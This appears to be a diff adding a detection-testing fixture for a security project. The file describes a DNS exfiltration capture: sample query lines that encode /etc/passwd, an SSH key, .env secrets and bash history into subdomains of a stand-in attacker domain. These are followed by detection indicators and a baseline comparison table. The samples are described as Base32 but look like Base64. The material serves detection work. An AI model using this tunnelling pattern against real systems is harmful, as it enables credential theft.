@@ -1,0 +1,91 @@
+# RubyGuardian Sample Network Capture Description - DNS Exfiltration
+# This file describes DNS-based data exfiltration traffic patterns
+# for use in detection rule testing and ML classifier training.
+#
+# Attack: Data encoded in DNS subdomain labels sent to attacker-controlled nameserver
+# MITRE ATT&CK: T1071.004 (Application Layer Protocol: DNS)
+# Source: Compromised Ruby process (PID 3072) after eval() chain exploitation
+# Exfiltrated data: /etc/passwd, SSH private key, .env credentials
+
+== Connection Summary ==
+Total DNS Queries: 847
+Unique Destination IPs: 2 (legitimate DNS + attacker DNS)
+Protocol: UDP port 53
+Duration: 45 seconds of exfiltration activity
+Data Exfiltrated: ~52 KB (encoded in subdomain labels)
+
+== Attacker DNS Infrastructure ==
+Attacker Nameserver: 198.51.100.53
+Exfiltration Domain: exfil.example.com
+Encoding: Base32 (case-insensitive, DNS-safe alphabet)
+Chunk Size: 63 bytes per subdomain label (DNS label limit)
+Transmission Rate: ~18 queries/second
+
+== Exfiltration Pattern ==
+
+--- Phase 1: /etc/passwd exfiltration (queries 1-32) ---
+Format: <base32_chunk>.<sequence_num>.<file_id>.exfil.example.com
+
+Query  1: cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA.0.passwd.exfil.example.com  A
+Query  2: ZGFlbW9uOng6MToxOmRhZW1vbjovdXNyL3NiaW46L3Vz.1.passwd.exfil.example.com  A
+Query  3: ci9zYmluL25vbG9naW4.2.passwd.exfil.example.com  A
+Query  4: YmluOng6MjoyOmJpbjovYmluOi91c3Ivc2Jpbi9ub2xv.3.passwd.exfil.example.com  A
+...
+Query 32: YXBwOng6MTAwMDoxMDAwOmFwcDovYXBwOi9iaW4vYmFz.31.passwd.exfil.example.com  A
+
+All responses: NXDOMAIN (attacker just logs the queries)
+
+--- Phase 2: SSH key exfiltration (queries 33-98) ---
+Format: <base32_chunk>.<sequence_num>.<file_id>.exfil.example.com
+
+Query 33: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0t.0.sshkey.exfil.example.com  A
+Query 34: LS0KYjNBlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9u.1.sshkey.exfil.example.com  A
+Query 35: ZQAAAAAAAAABI1AAAAMHNzaC1yc2EAAAADAQABAAABgQC8.2.sshkey.exfil.example.com  A
+...
+Query 98: LS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0t.65.sshkey.exfil.example.com  A
+
+--- Phase 3: .env credentials exfiltration (queries 99-112) ---
+Query  99: REFUQUJBU0VfVVJMPXBvc3RncmVzOi8vYXBwOnMzY3Jl.0.dotenv.exfil.example.com  A
+Query 100: dFBhc3NAZGItc2VydmVyOjU0MzIvcHJvZA.1.dotenv.exfil.example.com  A
+Query 101: U0VDUkVUX0tFWT1hMWIyYzNkNGU1ZjZnN2g4aTlqMGsx.2.dotenv.exfil.example.com  A
+...
+Query 112: QVdTX1NFQ1JFVF9BQ0NFU1NfS0VZPXdKYWxySS4u.13.dotenv.exfil.example.com  A
+
+--- Phase 4: Bash history exfiltration (queries 113-147) ---
+Query 113: c3NoIGFkbWluQDEwLjAuMC41MA.0.history.exfil.example.com  A
+Query 114: bXlzcWwgLXUgcm9vdCAtcA.1.history.exfil.example.com  A
+...
+
+== Detection Indicators ==
+
+HIGH CONFIDENCE indicators:
+- DNS query rate: 18.8 queries/sec (baseline: 0.2 queries/sec) [+9300%]
+- Subdomain label entropy: 5.8 bits/byte (normal DNS: 3.2 bits/byte)
+- Base32/Base64 character distribution in subdomain labels
+- Sequential numbering pattern in subdomain structure
+- All queries to single non-standard external nameserver
+- All responses are NXDOMAIN (data channel, not resolution)
+- Query names exceed 100 characters average (normal: ~25 characters)
+- UDP only to external IP (no corresponding TCP/HTTPS)
+
+MEDIUM CONFIDENCE indicators:
+- Queries use a single registered domain (exfil.example.com)
+- Subdomain depth of 4+ levels (chunk.seq.fileid.exfil.example.com)
+- No corresponding A record lookups for normal application domains
+- Burst pattern: 18 queries/sec for 45 seconds then stops
+- Source process (ruby) normally makes 0 direct DNS queries
+
+LOW CONFIDENCE indicators:
+- Unusual DNS query timing (evenly spaced at ~53ms intervals)
+- Query sizes consistently near maximum label length (63 chars)
+- No AAAA, MX, or TXT queries (only A records used as cover)
+
+== Comparison with Normal DNS ==
+| Metric                    | Normal          | Exfiltration    | Anomaly Factor |
+|---------------------------|-----------------|-----------------|----------------|
+| Queries per minute        | 12              | 1,128           | 94x            |
+| Avg subdomain length      | 18 chars        | 58 chars        | 3.2x           |
+| Subdomain entropy         | 3.2 bits/byte   | 5.8 bits/byte   | 1.8x           |
+| Unique destination IPs    | 1 (cluster DNS) | 2 (+ external)  | 2x             |
+| NXDOMAIN response rate    | 0.5%            | 100%            | 200x           |
+| Queries to external DNS   | 0               | 847             | infinite       |
